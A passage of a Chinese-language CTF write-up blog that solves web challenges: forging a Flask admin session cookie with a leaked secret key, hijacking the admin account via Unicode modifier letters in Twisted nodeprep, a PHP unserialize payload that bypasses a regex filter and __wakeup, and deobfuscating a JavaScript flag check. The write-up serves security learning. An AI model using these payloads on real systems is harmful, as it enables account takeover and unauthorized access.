class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app = Flask(__name__)<br><br><span class="hljs-comment">#key值可以使用随机数，或者自定义</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;XXXXX&#x27;</span><br>或者随机数<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">24</span>)<br>或者<br>app.secret_key = <span class="hljs-string">&#x27;why would I tell you my secret key?&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>所以伪造session就需要全局宏<code>SECRET_KEY</code></p><p>此时的config.py里面就是<strong>ckj123</strong></p><blockquote><p>SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’ #os.environ.get()函数的作用是获取系统的环境变量</p></blockquote><p>说到这里 暑假应该学几个主流的web框架</p><p>使用工具<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><blockquote><p>用法</p><h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.<span class="hljs-keyword">py</span> encode [-h] -s <span class="hljs-symbol">&lt;string&gt;</span> -t <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -t <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-structure <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie structure<br></code></pre></td></tr></table></figure><h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager.<span class="hljs-keyword">py</span> decode [-h] [-s <span class="hljs-symbol">&lt;string&gt;</span>] -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-value <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie value<br></code></pre></td></tr></table></figure></blockquote><p>使用工具 放入session和密钥进行解密</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;.eJw9kMFqwkAQhl-lzNlD3NiL4KGStCQwk8suw-xFrMYka2IhKhtXfPduLXgahv_j45-5w-Yw1ucWlpfxWs9g0-1heYe3b1iCZfHI-YT82WG2P4qyjhgT1GuHCpOK85SydV_puGm8EVNHquytLjwpVKKLmyizsM74yA3oipRC6yyTE2d70dRZLZFDRa7scSgmdDJZLnthSavsI6DKPekmFW08DnlSaQlxegl9S2wdhthPNyt4zGB3Hg-by8-xPr1OoIARl4S-ihT1boHavKMrW5uJrzLzp4l1j8FyfhPOg7BtbbN66rph29Qvk-H9ZPx_ctoOMYC5SmEG13M9Pr8G8wQevyIRbIY.YL7OEw.x49ZKtawASOf-9J3S9O9bWjVgTE&quot;</span> -s <span class="hljs-string">&quot;ckj123&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&#123;&#x27;_fresh&#x27;: False, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;&#125;<br></code></pre></td></tr></table></figure><p>然后伪造admin的session</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><p>放入工具 设置密钥 加密</p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">python3 .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;ef01a11ab07dcfc5c410c3c49a740e9361325cb7bee207c6a22ce8f5040f22778ceccb6ea3be66a3662e2b1261ebeaf78033a0587a502a49632a0c9a5fc31118&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;7332f44b717815922ad60850c9ee93ea2aa3afaf&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;QgqS&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<span class="hljs-string">&quot; -s &quot;</span>ckj123<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJw<span class="hljs-number">9</span>kMFqwkAQhl-lz<span class="hljs-symbol">NlD3</span><span class="hljs-symbol">NiL4</span>KGStCQwk<span class="hljs-number">8</span>suw-xFrMYka<span class="hljs-number">2</span>IhKhtXfPduLXgahv_j<span class="hljs-number">45</span><span class="hljs-number">-5</span>w-Yw<span class="hljs-number">1</span>ucWlpfxWs<span class="hljs-number">9</span><span class="hljs-name">g0</span><span class="hljs-number">-1</span>heYe<span class="hljs-number">3</span>b<span class="hljs-number">1</span>iCZfHI-YT<span class="hljs-number">82</span>W<span class="hljs-name">G2</span>P<span class="hljs-number">4</span>qyjhgT<span class="hljs-number">1</span>GuHCpOK<span class="hljs-number">85</span>SydV_puG<span class="hljs-name">m8</span>EV<span class="hljs-symbol">NHquytLjwpVKKLmyizsM74</span>yA<span class="hljs-number">3</span>oipRC<span class="hljs-number">6</span>yyTE<span class="hljs-number">2</span>d<span class="hljs-number">70</span>dRZLZFDRa<span class="hljs-number">7</span>scSgmdDJZL<span class="hljs-symbol">nthSavsI6</span>DKPekmFW<span class="hljs-number">08</span>D<span class="hljs-symbol">nlSaQlxegl9</span>S<span class="hljs-number">2</span>wdhthP<span class="hljs-symbol">Nyt4</span>zGB<span class="hljs-number">3</span>Hg-by<span class="hljs-number">8</span>-xPr<span class="hljs-number">1</span>OoIARl<span class="hljs-number">4</span>S-ihT<span class="hljs-number">1</span>boHavKMrW<span class="hljs-number">5</span>uJrzLzp<span class="hljs-number">4</span>l<span class="hljs-number">1</span>j<span class="hljs-number">8</span>FyfhPO<span class="hljs-name">g7</span>Btbb<span class="hljs-symbol">N66</span>rph<span class="hljs-number">29</span>Qvk-H<span class="hljs-number">9</span>ZPx_ctoOMYC<span class="hljs-number">5</span>SmE<span class="hljs-name">G13</span><span class="hljs-name">M9</span>Pr<span class="hljs-number">8</span><span class="hljs-name">G8</span>wQevyIRbIY.YL<span class="hljs-number">7</span>RrA.ztSPmJ<span class="hljs-number">8</span>Wrg-xigAr_j<span class="hljs-number">3</span>XyEwrheY<br></code></pre></td></tr></table></figure><p>登录后页面刷新抓包 修改session放包</p><h3 id="方法三、Unicode欺骗"><a href="#方法三、Unicode欺骗" class="headerlink" title="方法三、Unicode欺骗"></a>方法三、Unicode欺骗</h3><p>我们再聚焦于routes.py上 在register和login以及change三个模块上均有strlower()函数 而这个函数不是python的自带函数lower()</p><p>找一下这个函数原型或者有没有定义</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><p>调用了nodeprep.prepare()函数 继续跟进 发现导入了nodeprep模块 继续跟进发现这是来自twisted库</p><p>再注意到requirements.txt里面描述了twisted的版本 <strong>Twisted==10.2.0</strong> 对比官网发现版本已经很低了 存在有Unicode的漏洞 这个点只能说大多数早期开发都难免有这个问题或那个问题 而Unicode作为比较通用的东西 肯定是要测试的 当然有相关的漏洞报告复现出来更具有说服力 而不是像笔者只能复现wp</p><p>到这个网站<a href="https://unicode-table.com/en/search/?q=Modifier+Letter+Capital">Search - Unicode Character Table (unicode-table.com)</a> 挑选字符ᴬᴰᴹᴵᴺ</p><p>用这个字符注册 那么此时存入数据库的就应该是大写<strong>ADMIN</strong></p><p>那我们登录用ᴬᴰᴹᴵᴺ还是<strong>ADMIN</strong>呢</p><p>注意 登录操作也有一次strlower() 所以仍然需要是要假值ᴬᴰᴹᴵᴺ</p><p>然后 我们目的是修改掉admin的密码 然后以admin登录</p><p>那么就用change password功能修改密码 此时修改密码时 再次触发strlower()</p><p>此时<strong>ADMIN</strong>就变成了amdin覆盖掉数据库原来的值</p><p>就可以使用admin登录了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124512198.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124515020.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124538163.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124723891.png"></p><p>登录成功和回显证明ᴬᴰᴹᴵᴺ被转义为<strong>ADMIN</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124748298.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124805856.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124913625.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124926624.png"></p><h3 id="方法四、代码逻辑漏洞"><a href="#方法四、代码逻辑漏洞" class="headerlink" title="方法四、代码逻辑漏洞"></a>方法四、代码逻辑漏洞</h3><p>login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值</p><h2 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h2><p>这题其实很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$var</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @unserialize(<span class="hljs-variable">$var</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-string">&quot;index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10行：实例化Demo对象fl4g.php时，__wakeup()会重置file变量</p><p>19行：在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤。</p><blockquote><p>preg_match()中<strong>i</strong>表示不敏感大小写 里面匹配字符可以**/—/<strong>和</strong>/b—/b**(只匹配单词)匹配内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br>preg_match(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br><br><span class="hljs-comment">#从URL获取域名 写法一</span><br>preg_match(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<span class="hljs-string">&quot;http://www.php.net/index.html&quot;</span>, <span class="hljs-variable">$matches</span>)<span class="hljs-comment">//匹配http://和/划分开的三部分保存到数组</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">//提取中间的部分 即www.php.net</span><br>preg_match(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<span class="hljs-comment">//[^.]+中^匹配一次及以上 [^.]+表示不包含.字符的一个或多个字符 进行匹配两次 即得到php net 中间/. 即用.拼接 得到php.net覆盖到变量$matches</span><br><br><span class="hljs-comment">#URL获取域名 写法二</span><br>preg_match(‘/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">6</span>&#125;)([\/\w \.-]*)*\/?$/’）<br></code></pre></td></tr></table></figure><p>其他内容 去系统学习一下Perl的正则匹配</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Dmeo(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//o:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&quot;o:4&quot;</span>,<span class="hljs-string">&quot;o:+4&quot;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过正则匹配 具体见博客</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过__wakeup() 这个漏洞详见反序列化漏洞</span><br><span class="hljs-comment">//var_dump($a);</span><br>var_dump(base64_encode(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要说的是20、21行注释掉得到的<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>手动修改后<code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>base64加密放到payload不能拿到flag 如下图</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/21/.png"></p><p>这里有个坑，这里的file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。</p><h2 id="攻防世界NaNNaNNaNNaN-Batman"><a href="#攻防世界NaNNaNNaNNaN-Batman" class="headerlink" title="攻防世界NaNNaNNaNNaN-Batman"></a>攻防世界NaNNaNNaNNaN-Batman</h2><p>下载附件 得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script&gt;_=&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;[0]);.splice(0,1)&#125;&#125;&#125;\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;write(s[o%4]buttonif(e.ment&#x27;;for(Y in $=&#x27;&#x27;)with(_.split($[Y]))_=join(pop());eval(_)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>得到乱码 可以使用Sublime Text处理一下</p><p>将上面的代码最后的eval函数换为alert后放到www打开</p><p>得到源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/23/.png"></p><p>复制下来格式放到<a href="https://beautifier.io/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%8B">https://beautifier.io/处理一下</a> 得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;be0f233ac7be98aa&#x27;</span>).value<br>  <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&#x27;fl&#x27;</span>, <span class="hljs-string">&#x27;s_a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;e&#125;&#x27;</span>]<br>            <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;_h0l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&#x27;g&#123;&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_0&#x27;</span>]<br>            <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> s = [t, n, r, i]<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>              <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>])<br>              s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>)<br><span class="hljs-keyword">delete</span> _<br></code></pre></td></tr></table></figure><p>代码审计的话 就要懂正则表达式了 ^表示匹配开头 $表示匹配末尾</p><p>多个if下来得到payload:<code>be0f23233ace98aa</code> 放到输入框得到flag 但是我没有成功</p><p>放到控制台也尝试了 原因未明</p><p>那么就直接跳过if 将下面代码放到控制台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];<br><span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];<br><span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> s = [t, n, r, i];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>    <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>    s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)；<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210623183118168.png"></p><h2 id="BUU-CODE-REVIEW"><a href="#BUU-CODE-REVIEW" class="headerlink" title="BUU CODE REVIEW"></a>BUU CODE REVIEW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 